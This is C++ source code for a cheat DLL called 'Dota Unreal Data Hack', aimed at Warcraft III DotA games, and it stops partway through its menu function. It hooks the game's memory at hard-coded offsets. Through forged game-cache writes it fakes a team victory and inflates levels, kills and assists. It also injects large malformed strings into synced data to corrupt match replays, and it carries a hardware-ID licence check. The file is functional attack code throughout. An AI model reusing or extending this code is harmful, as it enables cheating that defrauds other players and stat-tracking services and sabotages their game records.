#define _WIN32_WINNT 0x0501 
#define WINVER 0x0501 
#define NTDDI_VERSION 0x05010000
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <vector>
#include <sstream>
using namespace std;


#include "sha256.h"

std::string PASTEHWIDHERE = std::string( "70d864467ae96299a1502f83d99dcc24b88e177fe4f824267d758cfb58cf626491" );


#define IsGameEndThenRestart if (!IsGame()) goto restartgame
#define IsGameEndThenExit if (!IsGame()) return

std::string GetHWID( )
{
	std::stringstream ss;
	char CPUString[ 0x20 ];
	char CPUBrandString[ 0x40 ];
	int CPUInfo[ 4 ] = { -1 };
	int nSteppingID = 0;
	int nModel = 0;
	int nFamily = 0;
	int nProcessorType = 0;
	int nExtendedmodel = 0;
	int nExtendedfamily = 0;
	int nBrandIndex = 0;
	int nCLFLUSHcachelinesize = 0;
	int nLogicalProcessors = 0;
	int nFeatureInfo = 0;
	int nCacheLineSize = 0;
	int nL2Associativity = 0;
	int nCacheSizeK = 0;
	int nVirtualAddress = 0;
	int nRet = 0;

	int nCores = 0;
	int nCacheType = 0;
	int nCacheLevel = 0;
	int nMaxThread = 0;
	int nSysLineSize = 0;

	int nWaysAssociativity = 0;
	int nNumberSets = 0;

	unsigned    nIds , nExIds , i;

	BOOL    bSSE3Instructions = FALSE;
	BOOL    bMONITOR_MWAIT = FALSE;
	BOOL    bCPLQualifiedDebugStore = FALSE;
	BOOL    bVirtualMachineExtensions = FALSE;
	BOOL    bEnhancedIntelSpeedStepTechnology = FALSE;
	BOOL    bThermalMonitor2 = FALSE;
	BOOL    bSupplementalSSE3 = FALSE;
	BOOL    bL1ContextID = FALSE;
	BOOL    bCMPXCHG16B = FALSE;
	BOOL    bxTPRUpdateControl = FALSE;
	BOOL    bPerfDebugCapabilityMSR = FALSE;
	BOOL    bSSE41Extensions = FALSE;
	BOOL    bSSE42Extensions = FALSE;
	BOOL    bPOPCNT = FALSE;

	BOOL    bMultithreading = FALSE;

	BOOL    bLAHF_SAHFAvailable = FALSE;
	BOOL    bCmpLegacy = FALSE;
	BOOL    bSVM = FALSE;
	BOOL    bExtApicSpace = FALSE;
	BOOL    bAltMovCr8 = FALSE;
	BOOL    bLZCNT = FALSE;
	BOOL    bSSE4A = FALSE;
	BOOL    bMisalignedSSE = FALSE;
	BOOL    bPREFETCH = FALSE;
	BOOL    bSKINITandDEV = FALSE;
	BOOL    bSYSCALL_SYSRETAvailable = FALSE;
	BOOL    bExecuteDisableBitAvailable = FALSE;
	BOOL    bMMXExtensions = FALSE;
	BOOL    bFFXSR = FALSE;
	BOOL    b1GBSupport = FALSE;
	BOOL    bRDTSCP = FALSE;
	BOOL    b64Available = FALSE;
	BOOL    b3DNowExt = FALSE;
	BOOL    b3DNow = FALSE;
	BOOL    bNestedPaging = FALSE;
	BOOL    bLBRVisualization = FALSE;
	BOOL    bFP128 = FALSE;
	BOOL    bMOVOptimization = FALSE;

	BOOL    bSelfInit = FALSE;
	BOOL    bFullyAssociative = FALSE;

	// __cpuid with an InfoType argument of 0 returns the number of
	// valid Ids in CPUInfo[0] and the CPU identification string in
	// the other three array elements. The CPU identification string is
	// not in linear order. The code below arranges the information 
	// in a human readable form.
	__cpuid( CPUInfo , 0 );
	nIds = CPUInfo[ 0 ];
	memset( CPUString , 0 , sizeof( CPUString ) );
	*( ( int* ) CPUString ) = CPUInfo[ 1 ];
	*( ( int* ) ( CPUString + 4 ) ) = CPUInfo[ 3 ];
	*( ( int* ) ( CPUString + 8 ) ) = CPUInfo[ 2 ];



		__cpuid( CPUInfo , 1 );


		
			nSteppingID = CPUInfo[ 0 ] & 0xf;
			nModel = ( CPUInfo[ 0 ] >> 4 ) & 0xf;
			nFamily = ( CPUInfo[ 0 ] >> 8 ) & 0xf;
			nProcessorType = ( CPUInfo[ 0 ] >> 12 ) & 0x3;
			nExtendedmodel = ( CPUInfo[ 0 ] >> 16 ) & 0xf;
			nExtendedfamily = ( CPUInfo[ 0 ] >> 20 ) & 0xff;
			nBrandIndex = CPUInfo[ 1 ] & 0xff;
			nCLFLUSHcachelinesize = 0;
			nLogicalProcessors = 0;
			bSSE3Instructions = ( CPUInfo[ 2 ] & 0x1 ) || FALSE;
			bMONITOR_MWAIT = ( CPUInfo[ 2 ] & 0x8 ) || FALSE;
			bCPLQualifiedDebugStore = ( CPUInfo[ 2 ] & 0x10 ) || FALSE;
			bVirtualMachineExtensions = ( CPUInfo[ 2 ] & 0x20 ) || FALSE;
			bEnhancedIntelSpeedStepTechnology = ( CPUInfo[ 2 ] & 0x80 ) || FALSE;
			bThermalMonitor2 = ( CPUInfo[ 2 ] & 0x100 ) || FALSE;
			bSupplementalSSE3 = ( CPUInfo[ 2 ] & 0x200 ) || FALSE;
			bL1ContextID = ( CPUInfo[ 2 ] & 0x300 ) || FALSE;
			bCMPXCHG16B = ( CPUInfo[ 2 ] & 0x2000 ) || FALSE;
			bxTPRUpdateControl = ( CPUInfo[ 2 ] & 0x4000 ) || FALSE;
			bPerfDebugCapabilityMSR = ( CPUInfo[ 2 ] & 0x8000 ) || FALSE;
			bSSE41Extensions = ( CPUInfo[ 2 ] & 0x80000 ) || FALSE;
			bSSE42Extensions = ( CPUInfo[ 2 ] & 0x100000 ) || FALSE;
			bPOPCNT = ( CPUInfo[ 2 ] & 0x800000 ) || FALSE;
			nFeatureInfo = CPUInfo[ 3 ];
			bMultithreading = ( nFeatureInfo & ( 1 << 28 ) ) || FALSE;


			ss << nSteppingID << nModel << nFamily << nProcessorType << nExtendedmodel
				<< nExtendedfamily << nBrandIndex << nCLFLUSHcachelinesize << nLogicalProcessors
				<< bSSE3Instructions << bMONITOR_MWAIT << bCPLQualifiedDebugStore
				<< bVirtualMachineExtensions << bEnhancedIntelSpeedStepTechnology << bThermalMonitor2
				<< bSupplementalSSE3 << bL1ContextID << bCMPXCHG16B << bxTPRUpdateControl
				<< bPerfDebugCapabilityMSR << bSSE41Extensions << bSSE42Extensions << bPOPCNT
				<< nFeatureInfo << bMultithreading;

			MEMORYSTATUSEX statex;

			statex.dwLength = sizeof ( statex );

			GlobalMemoryStatusEx( &statex );
			ss << statex.ullTotalPhys;

	SHA256 sha256;
	return sha256( ss.str( ) );
}

#define IsKeyPressed(CODE) (GetAsyncKeyState(CODE) & 0x8000) > 0

typedef void *( __fastcall * GetBtnAddrGAME )( char * a2 , int  INDEX );
GetBtnAddrGAME GetBtnAddr_p;

BOOL initializedgamedll = FALSE;

int GameDll = 0;

UINT gamecache = 0;

BOOL ingame = FALSE;


HANDLE thr1;


HANDLE thr2;


BOOL IsLagScreen( )
{
	return GetBtnAddr_p( "SuspendDropPlayersButton" , 0 ) > 0;
}

BOOL IsGame( ) // my offset + public
{
	return *( int* ) ( ( UINT32 ) GameDll + 0xACF678 ) > 0 || *( int* ) ( ( UINT32 ) GameDll + 0xAB62A4 ) > 0;
}




#pragma region PureHackCode


int GetGameGlobalClassAddr( )
{
	return *( int* ) ( 0xAB4F80 + GameDll );
}

int GetGlobalPlayerData( )
{
	return *( int* ) ( 0xAB65F4 + GameDll );
}

int GetLocalPlayerNumber( )
{
	return ( int ) *( unsigned short * ) ( GetGlobalPlayerData( ) + 0x28 );
}

UINT32 GetPlayerByNumber( int number )
{
	return *( ( DWORD * ) GetGlobalPlayerData() + number + 22);
	//return GetGlobalPlayerData( ) + number * 4 + 0x58;
}

UINT32 GetLocalPlayer( )
{
	return GetPlayerByNumber( GetLocalPlayerNumber( ) );
}

int Get6FAB7788( )
{
	return *( int* ) ( GameDll + 0xAB7788 );
}



signed int __fastcall sub_6F03FA30( unsigned int a1 , int a2 )
{
	BOOL v2; // zf@3
	signed int result; // eax@7
	int v4; // ecx@9
	int v5; // ecx@10

	if ( !( a1 >> 31 ) )
	{
		if ( a1 < *( UINT32 * ) ( Get6FAB7788( ) + 28 ) )
		{
			v2 = *( UINT32 * ) ( *( UINT32 * ) ( Get6FAB7788( ) + 12 ) + 8 * a1 ) == -2;
			goto LABEL_6;
		}
		return 0;
	}
	if ( ( a1 & 0x7FFFFFFF ) >= *( UINT32 * ) ( Get6FAB7788( ) + 60 ) )
		return 0;
	v2 = *( UINT32 * ) ( *( UINT32 * ) ( Get6FAB7788( ) + 44 ) + 8 * a1 ) == -2;
LABEL_6:
	if ( !v2 )
		return 0;
	if ( a1 >> 31 )
	{
		v4 = *( UINT32 * ) ( *( UINT32 * ) ( Get6FAB7788( ) + 44 ) + 8 * a1 + 4 );
		result = *( UINT32 * ) ( v4 + 24 ) != a2 ? 0 : v4;
	}
	else
	{
		v5 = *( UINT32 * ) ( *( UINT32 * ) ( Get6FAB7788( ) + 12 ) + 8 * a1 + 4 );
		result = *( UINT32 * ) ( v5 + 24 ) != a2 ? 0 : v5;
	}
	return result;
}

int __fastcall sub_6F473170( int a22 , int unused )
{
	return *( UINT32 * ) ( sub_6F03FA30( *( UINT32 * ) ( a22 + 8 ) , *( UINT32 * ) ( a22 + 12 ) ) + 120 );
}

typedef int( __fastcall * psub_6F41B420 )( int , int );
psub_6F41B420 sub_6F41B420;


/*
int __thiscall sub_6F3A1650( void *this , int a2 )
{
return *( ( _UINT32 * )this + a2 + 22 );
}

*/


struct Unit
{
	DWORD dwDummy[ 3 ];
	DWORD dwID1;
	DWORD dwID2;
	BYTE _1[ 0x1C ];
	DWORD dwClassId;
	BYTE _2[ 0x1C ];
	DWORD HealthBar;
	DWORD UNK;
	DWORD dwOwnerSlot;
};

DWORD GetUnitOwningPlayer( Unit* unit )
{
	DWORD num = unit->dwOwnerSlot;
	return GetPlayerByNumber( num );
}



Unit* GetSelectedAnyUnit( )
{
	DWORD plr = GetLocalPlayer( );
	DWORD rt;
	__asm
	{
		MOV EAX , plr;
		MOV ECX , DWORD PTR DS : [ EAX + 0x34 ];
		MOV EAX , DWORD PTR DS : [ ECX + 0x1E0 ];
		MOV rt , EAX;
	}
	return ( Unit* ) rt;
}

void SendMoveAttackCommand( float X , float Y, DWORD cmdId = 0xD0003 )
{
	int globalclass = GetGameGlobalClassAddr( );
	int _MoveAttackCmd = 0x339DD0 + GameDll;
	__asm
	{
		PUSH 0
			PUSH 6
			PUSH 0
			MOV ECX , globalclass
			MOV ECX , DWORD PTR DS : [ ECX + 0x1B4 ];
		PUSH Y
			PUSH X
			PUSH 0
			PUSH cmdId
			CALL _MoveAttackCmd
	}

}


Unit* GetSelectedOwnedUnit( )
{
	
	UINT32 plr = GetLocalPlayer( );
	UINT32 rt;
	Unit* returnunit;
	
	__asm
	{
		MOV EAX , plr;
		MOV ECX , DWORD PTR DS : [ EAX + 0x34 ];
		MOV EAX , DWORD PTR DS : [ ECX + 0x1E0 ];
		MOV rt , EAX;
	}
	
	returnunit = ( Unit* ) rt;
	
	if ( rt )
	{
		if ( returnunit->dwOwnerSlot == GetLocalPlayerNumber( ) )
		{
			return ( Unit* ) rt;
		}
	}

	return NULL;
}


#pragma endregion





void TextPrint( char *szText , float fDuration )
{
	UINT32 dwDuration = *( ( UINT32 * ) &fDuration );
	UINT32 GAME_GlobalClass = GameDll + 0xAB4F80;
	UINT32 GAME_PrintToScreen = GameDll + 0x2F8E40;
	__asm
	{
		PUSH	0xFFFFFFFF
			PUSH	dwDuration
			PUSH	szText
			PUSH	0x0
			PUSH	0x0
			MOV		ECX , [ GAME_GlobalClass ]
			MOV		ECX , [ ECX ]
			CALL	GAME_PrintToScreen
	}
}

char * GetStringFromJSID( UINT32 JSID )
{
	UINT32 Convert = GameDll + 0x459640;
	UINT32 GetCurrentJassEnvironment = GameDll + 0x44B2E0;
	char * cRet;

	__asm
	{
		push JSID;
		mov ecx , 1;
		call GetCurrentJassEnvironment;
		mov ecx , eax;
		call Convert;
		mov ecx , DWORD ptr ds : [ eax + 0x08 ];
		mov eax , DWORD ptr ds : [ ecx + 0x1C ];
		mov cRet , eax;
	}

	return cRet;
}


struct JassStringData
{
	UINT32 vtable;
	UINT32 refCount;
	UINT32 dwUnk1;
	UINT32 pUnk2;
	UINT32 pUnk3;
	UINT32 pUnk4;
	UINT32 pUnk5;
	char *data;
};


struct JassString
{
	UINT32 vtable;
	UINT32 dw0;
	JassStringData *data;
	UINT32 dw1;
};


struct JassStringClearStruct
{
	JassString * jstring;
	int timer;
};


void GetJassString( char *szString , JassString *String )
{
	int Address = GameDll + 0x011300;


	__asm
	{
		PUSH szString;
		MOV ECX , String;
		CALL Address;
	}
}

struct ReadDotaInfoStruct
{
	int hero;     // 4
	int kills;       // 8
	int deaths;      // 12
	int assists;     // 16
	int creeps;      // 20
	int gold;        // 24
	int towers;      // 28
	int couriers;      // 32
	int item1;    // 36
	int item2;    // 40
	int item3;    // 44 
	int item4;    // 48
	int item5;    // 52
	int item6;    // 56
};

struct ActionStruct
{
	int actionid;
	int player1id;
	int player2id;
	int actiondata;
};


int Player( int id )
{
	switch ( id )
	{
		case 6:
			return 7;
		case 7:
			return 8;
		case 8:
			return 9;
		case 9:
			return 10;
		case 10:
			return 11;

		default:
			break;
	}

	return id;
}

JassString * fordetect;
JassString * jData;
JassString * jGlobal;
JassString * jWinner;
JassString * jM;
JassString * jS;
JassString * jThrone;
JassString * jTree;
JassString * jGameStart;

typedef void( __cdecl * pStoreInteger )( UINT cache , JassString *missionKey , JassString *key , int value );
pStoreInteger StoreInteger;

typedef void( __cdecl * pSyncStoredInteger )( UINT cache , JassString *missionKey , JassString *key );
pSyncStoredInteger SyncStoredInteger;

typedef int( __cdecl * pGetStoredInteger )( UINT cache , JassString *missionKey , JassString *key );
pGetStoredInteger GetStoredInteger;

typedef void( __cdecl * pClearTextMessages )( );
pClearTextMessages ClearTextMessages;

typedef void( __cdecl * pClearSelection )( );
pClearSelection ClearSelection;

typedef int( __cdecl * pGetUnitTypeId )( UINT unit );
pGetUnitTypeId GetUnitTypeId;

typedef UINT( __cdecl * pGetOwningPlayer )( UINT unit );
pGetOwningPlayer GetOwningPlayer;

typedef int( __cdecl * pGetPlayerId )( UINT whichPlayer );
pGetPlayerId GetPlayerId;

typedef void( __cdecl * pSetUnitVertexColor )( UINT whichUnit , int red , int green , int blue , int alpha );
pSetUnitVertexColor SetUnitVertexColor;

typedef BOOL( __cdecl * pIsUnitIllusion )( UINT whichUnit );
pIsUnitIllusion IsUnitIllusion;


void SetTlsForMe( )
{
	UINT32 Data = *( UINT32 * ) ( GameDll + 0xACEB4C );
	UINT32 TlsIndex = *( UINT32 * ) ( GameDll + 0xAB7BF4 );
	if ( TlsIndex )
	{
		UINT32 v5 = **( UINT32 ** ) ( *( UINT32 * ) ( *( UINT32 * ) ( GameDll + 0xACEB5C ) + 4 * Data ) + 44 );
		if ( !v5 || !( *( LPVOID * ) ( v5 + 520 ) ) )
		{
			Sleep( 1000 );
			SetTlsForMe( );
			return;
		}
		TlsSetValue( TlsIndex , *( LPVOID * ) ( v5 + 520 ) );
	}
	else
	{
		Sleep( 1000 );
		SetTlsForMe( );
		return;
	}
}

void CreateFirstBlood( )
{


}

void StartGame( )
{
	StoreInteger( gamecache , jData , jGameStart , 1 );
	SyncStoredInteger( gamecache , jData , jGameStart );
	StoreInteger( gamecache , jData , jGameStart , 1 );
	SyncStoredInteger( gamecache , jData , jGameStart );
	StoreInteger( gamecache , jData , jGameStart , 1 );
	SyncStoredInteger( gamecache , jData , jGameStart );
	StoreInteger( gamecache , jData , jGameStart , 1 );
	SyncStoredInteger( gamecache , jData , jGameStart );
}

void KillThrone( )
{
	StoreInteger( gamecache , jData , jThrone , 75 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 75 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 75 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 75 );
	SyncStoredInteger( gamecache , jData , jThrone );


	StoreInteger( gamecache , jData , jThrone , 50 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 50 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 50 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 50 );
	SyncStoredInteger( gamecache , jData , jThrone );


	StoreInteger( gamecache , jData , jThrone , 25 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 25 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 25 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 25 );
	SyncStoredInteger( gamecache , jData , jThrone );


	StoreInteger( gamecache , jData , jThrone , 10 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 10 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 10 );
	SyncStoredInteger( gamecache , jData , jThrone );
	StoreInteger( gamecache , jData , jThrone , 10 );
	SyncStoredInteger( gamecache , jData , jThrone );

}

void KillTree( )
{

	StoreInteger( gamecache , jData , jTree , 75 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 75 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 75 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 75 );
	SyncStoredInteger( gamecache , jData , jTree );


	StoreInteger( gamecache , jData , jTree , 50 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 50 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 50 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 50 );
	SyncStoredInteger( gamecache , jData , jTree );


	StoreInteger( gamecache , jData , jTree , 25 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 25 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 25 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 25 );
	SyncStoredInteger( gamecache , jData , jTree );


	StoreInteger( gamecache , jData , jTree , 10 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 10 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 10 );
	SyncStoredInteger( gamecache , jData , jTree );
	StoreInteger( gamecache , jData , jTree , 10 );
	SyncStoredInteger( gamecache , jData , jTree );

}

void WinhackTeam1( )
{

	int TimeM = 5 + ( rand( ) % 54 );
	int TimeS = rand( ) % 59;

	StartGame( );

	Sleep( 3000 );
	IsGameEndThenExit;
	KillThrone( );

	Sleep( 3000 );
	IsGameEndThenExit;

	StoreInteger( gamecache , jGlobal , jWinner , 1 );
	StoreInteger( gamecache , jGlobal , jM , TimeM );
	StoreInteger( gamecache , jGlobal , jS , TimeS );
	SyncStoredInteger( gamecache , jGlobal , jWinner );
	SyncStoredInteger( gamecache , jGlobal , jM );
	SyncStoredInteger( gamecache , jGlobal , jS );

	StoreInteger( gamecache , jGlobal , jWinner , 1 );
	StoreInteger( gamecache , jGlobal , jM , TimeM );
	StoreInteger( gamecache , jGlobal , jS , TimeS );
	SyncStoredInteger( gamecache , jGlobal , jWinner );
	SyncStoredInteger( gamecache , jGlobal , jM );
	SyncStoredInteger( gamecache , jGlobal , jS );

	StoreInteger( gamecache , jGlobal , jWinner , 1 );
	StoreInteger( gamecache , jGlobal , jM , TimeM );
	StoreInteger( gamecache , jGlobal , jS , TimeS );
	SyncStoredInteger( gamecache , jGlobal , jWinner );
	SyncStoredInteger( gamecache , jGlobal , jM );
	SyncStoredInteger( gamecache , jGlobal , jS );

	StoreInteger( gamecache , jGlobal , jWinner , 1 );
	StoreInteger( gamecache , jGlobal , jM , TimeM );
	StoreInteger( gamecache , jGlobal , jS , TimeS );
	SyncStoredInteger( gamecache , jGlobal , jWinner );
	SyncStoredInteger( gamecache , jGlobal , jM );
	SyncStoredInteger( gamecache , jGlobal , jS );

}


void WinhackTeam2( )
{

	int TimeM = 5 + ( rand( ) % 54 );
	int TimeS = rand( ) % 59;
	StartGame( );

	Sleep( 3000 );
	IsGameEndThenExit;
	KillTree( );

	Sleep( 3000 );
	IsGameEndThenExit;

	StoreInteger( gamecache , jGlobal , jWinner , 2 );
	StoreInteger( gamecache , jGlobal , jM , TimeM );
	StoreInteger( gamecache , jGlobal , jS , TimeS );
	SyncStoredInteger( gamecache , jGlobal , jWinner );
	SyncStoredInteger( gamecache , jGlobal , jM );
	SyncStoredInteger( gamecache , jGlobal , jS );

	StoreInteger( gamecache , jGlobal , jWinner , 2 );
	StoreInteger( gamecache , jGlobal , jM , TimeM );
	StoreInteger( gamecache , jGlobal , jS , TimeS );
	SyncStoredInteger( gamecache , jGlobal , jWinner );
	SyncStoredInteger( gamecache , jGlobal , jM );
	SyncStoredInteger( gamecache , jGlobal , jS );

	StoreInteger( gamecache , jGlobal , jWinner , 2 );
	StoreInteger( gamecache , jGlobal , jM , TimeM );
	StoreInteger( gamecache , jGlobal , jS , TimeS );
	SyncStoredInteger( gamecache , jGlobal , jWinner );
	SyncStoredInteger( gamecache , jGlobal , jM );
	SyncStoredInteger( gamecache , jGlobal , jS );

	StoreInteger( gamecache , jGlobal , jWinner , 2 );
	StoreInteger( gamecache , jGlobal , jM , TimeM );
	StoreInteger( gamecache , jGlobal , jS , TimeS );
	SyncStoredInteger( gamecache , jGlobal , jWinner );
	SyncStoredInteger( gamecache , jGlobal , jM );
	SyncStoredInteger( gamecache , jGlobal , jS );

}

void UpLevelTo( int playerid , int level )
{
	for ( int i = 1; i < level; )
	{
		i++;
		char * lvldata = new char[ 20 ];
		sprintf_s( lvldata , 20 , "Level%i" , i );
		JassString * lvlstring = new JassString( );
		GetJassString( lvldata , lvlstring );
		StoreInteger( gamecache , jData , lvlstring , playerid );
		SyncStoredInteger( gamecache , jData , lvlstring );
		delete[ ] lvldata;
	}


}

void UpAssistsTo( int playerid1 , int playerid2 , int assists )
{
	for ( int i = 1; i < assists; i++ )
	{
		char * lvldata = new char[ 20 ];
		sprintf_s( lvldata , 20 , "Assist%i" , playerid1 );
		JassString * lvlstring = new JassString( );
		GetJassString( lvldata , lvlstring );
		StoreInteger( gamecache , jData , lvlstring , playerid2 );
		SyncStoredInteger( gamecache , jData , lvlstring );
		delete[ ] lvldata;
	}


}

void UpKillsTo( int playerid1 , int playerid2 , int kills )
{
	for ( int i = 1; i < kills; i++ )
	{
		char * lvldata = new char[ 20 ];
		sprintf_s( lvldata , 20 , "Hero%i" , playerid2 );
		JassString * lvlstring = new JassString( );
		GetJassString( lvldata , lvlstring );
		StoreInteger( gamecache , jData , lvlstring , playerid1 );
		SyncStoredInteger( gamecache , jData , lvlstring );
		delete[ ] lvldata;
	}


}

void SwapSwap( int from , int to , int data )
{
	char * swapdata = new char[ 100 ];
	sprintf_s( swapdata , 100 , "SWAP_%i_%i" , from , to );
	JassString * jswapdata = new JassString( );
	GetJassString( swapdata , jswapdata );
	StoreInteger( gamecache , jData , jswapdata , data );
	SyncStoredInteger( gamecache , jData , jswapdata );
	delete[ ]swapdata;
}

void PlayerLeave( int player , int data1 , int data2 , int data3 , int orgdata )
{
	char * swapdata = new char[ 100 ];
	sprintf_s( swapdata , 100 , "CK%iD%iN%i" , data1 , data2 , data3 );
	JassString * jswapdata = new JassString( );
	GetJassString( swapdata , jswapdata );
	StoreInteger( gamecache , jData , jswapdata , player );
	SyncStoredInteger( gamecache , jData , jswapdata );
	delete[ ]swapdata;
}


void SetTimeTo( int min , int sec )
{
	StoreInteger( gamecache , jGlobal , jM , min );
	StoreInteger( gamecache , jGlobal , jS , sec );
	SyncStoredInteger( gamecache , jGlobal , jM );
	SyncStoredInteger( gamecache , jGlobal , jS );
}


BYTE * GetRandomBytesWithLength( int length )
{
	BYTE * randombytes = new BYTE[ length ];

	for ( int i = 0; i < length; i++ )
	{
		randombytes[ i ] = -1 + rand( ) % 255;
	}

	return randombytes;
}

int sleeptimer = 0;
void WriteBadStringv3( )
{
	int stringsize = 500000;
	char * badstring = new char[ stringsize ];
	for ( int i = 0; i < stringsize; i++ )
	{
		badstring[ i ] = ( char ) ( -255 + rand( ) % 510 );
	}

	badstring[ 5555 ] = '\xFF';
	badstring[ 5556 ] = '\xFF';
	badstring[ 5557 ] = '\xFF';
	badstring[ 5558 ] = '\x0E';
	badstring[ 5559 ] = '\x0D';
	badstring[ 5560 ] = '\xFF';
	badstring[ 5561 ] = '\xFF';
	badstring[ 5562 ] = '\xFF';
	badstring[ 5563 ] = 'z';
	badstring[ 5564 ] = 'l';
	badstring[ 5565 ] = 'i';
	badstring[ 5566 ] = 'b';
	badstring[ 5567 ] = '\xFF';
	badstring[ 5568 ] = '\xFF';
	badstring[ 5569 ] = '\xFF';
	badstring[ 5570 ] = '\x1f';
	badstring[ 5571 ] = '\x8b';
	badstring[ 5572 ] = '\x08';
	badstring[ 5573 ] = '\x08';
	badstring[ 5574 ] = '\x8b';
	badstring[ 5575 ] = '\x1f';
	badstring[ 5576 ] = '\xFF';
	badstring[ 5577 ] = '\xFF';

	JassString * badjassstring = new JassString( );
	GetJassString( badstring , badjassstring );
	StoreInteger( gamecache , jData , badjassstring , INT_MIN + rand( ) % INT_MAX );
	SyncStoredInteger( gamecache , jData , badjassstring );
	delete[ ]badstring;
}
void WriteBadStringv2( )
{
	int stringsize = 1 + ( rand( ) % 50000 );
	char * badstring = new char[ stringsize ];
	for ( int i = 0; i < stringsize; i++ )
	{
		badstring[ i ] = ( char ) ( -255 + rand( ) % 510 );
	}
	JassString * badjassstring = new JassString( );
	GetJassString( badstring , badjassstring );
	BYTE * memforfree = GetRandomBytesWithLength( stringsize );
	CopyMemory( badjassstring->data->data , memforfree , stringsize );
	StoreInteger( gamecache , jData , badjassstring , INT_MIN + rand( ) % INT_MAX );
	StoreInteger( gamecache , jGlobal , badjassstring , INT_MIN + rand( ) % INT_MAX );
	StoreInteger( gamecache , badjassstring , badjassstring , INT_MIN + rand( ) % INT_MAX );
	SyncStoredInteger( gamecache , jData , badjassstring );
	SyncStoredInteger( gamecache , jGlobal , badjassstring );
	SyncStoredInteger( gamecache , badjassstring , badjassstring );
	delete[ ]badstring;
	delete[ ]memforfree;

	WriteBadStringv3( );
}
void WriteBadString( )
{

	sleeptimer++;

	if ( sleeptimer > 100 )
	{
		sleeptimer = 0;
		Sleep( 1000 );
		IsGameEndThenExit;
	}

	int stringsize = 555;

	char * badstring = new char[ stringsize ];
	for ( int i = 0; i < stringsize; i++ )
	{
		badstring[ i ] = ( char ) ( -128 + rand( ) % 270 );
	}
	JassString * badjassstring = new JassString( );
	GetJassString( badstring , badjassstring );
	//badjassstring->data->data = (char *)GetRandomBytesWithLength( 1024 * 10000 );

	StoreInteger( gamecache , jData , badjassstring , INT_MIN + rand( ) % INT_MAX );
	StoreInteger( gamecache , jGlobal , badjassstring , INT_MIN + rand( ) % INT_MAX );
	StoreInteger( gamecache , badjassstring , jGlobal , INT_MIN + rand( ) % INT_MAX );
	SyncStoredInteger( gamecache , jData , badjassstring );
	SyncStoredInteger( gamecache , jGlobal , badjassstring );
	SyncStoredInteger( gamecache , badjassstring , jGlobal );
	delete[ ]badstring;

	Sleep( 15 );

	WriteBadStringv2( );
}


void MakeBad( )
{
	WriteBadString( );
	Sleep( 2500 );
	IsGameEndThenExit;
	for ( int i = 0; i < 15; i++ )
	{
		for ( int n = 0; n < 15; n++ )
		{
			int tmprnd1 = INT_MIN + ( rand( ) % INT_MAX - 1 );
			SwapSwap( i , n , tmprnd1 );
			PlayerLeave( i , 1 , 2 , 3 , n );
		}
		Sleep( 1800 );
		IsGameEndThenExit;
	}
	SetTimeTo( INT_MIN + ( rand( ) % 1000 ) , INT_MAX - ( rand( ) % 1000 ) );
	WriteBadString( );
}



UINT GetMaxUnitForMap( )
{
	UINT tmp = 0;
	UINT32 tmpaddr = *( UINT32* ) ( GameDll + 0xAAE2FC );
	if ( tmpaddr )
	{
		tmp += *( UINT* ) ( tmpaddr + 0x428 );
		if ( tmp )
		{
			tmp += 0x100000;
			if ( tmp == 0x100000 )
				return 0x1FFFFF;
		}
	}
	return tmp;
}


BOOL jassstringinitialized = FALSE;


void InitGameCache( )
{

	while ( TRUE )
	{



		for ( UINT i = 0x100000; i < GetMaxUnitForMap( ); i++ )
		{
			StoreInteger( i , fordetect , fordetect , 123 );
			if ( GetStoredInteger( i , fordetect , fordetect ) == 123 )
			{
				gamecache = i;
				return;
			}
		}

		Sleep( 1000 );
		IsGameEndThenExit;
	}

}

int menuid = 0;
BOOL ismenuopened = FALSE;


void ShowMainMenu( )
{

	TextPrint( "Вы открыли меню Dota Unreal Data Hack.\nВыберите нужное Вам действие:\n \n1. Я хочу победить!\n2. Я хочу убить реплей!\n3. Я хочу изменить игровые данные!\n \n0. Выход из меню\n" , 1 );

	if ( IsKeyPressed( VK_NUMPAD0 ) || IsKeyPressed( '0' ) )
	{
		menuid = 0;
		ClearTextMessages( );
		while ( IsKeyPressed( VK_NUMPAD0 ) || IsKeyPressed( '0' ) )
		{
			Sleep( 20 );
		}
		return;
	}




	if ( IsKeyPressed( VK_NUMPAD1 ) || IsKeyPressed( '1' ) )
	{
		menuid = 2;
		ClearTextMessages( );
		while ( IsKeyPressed( VK_NUMPAD1 ) || IsKeyPressed( '1' ) )
		{
			Sleep( 20 );
		}
		return;
	}

	if ( IsKeyPressed( VK_NUMPAD2 ) || IsKeyPressed( '2' ) )
	{
		menuid = 3;
		ClearTextMessages( );
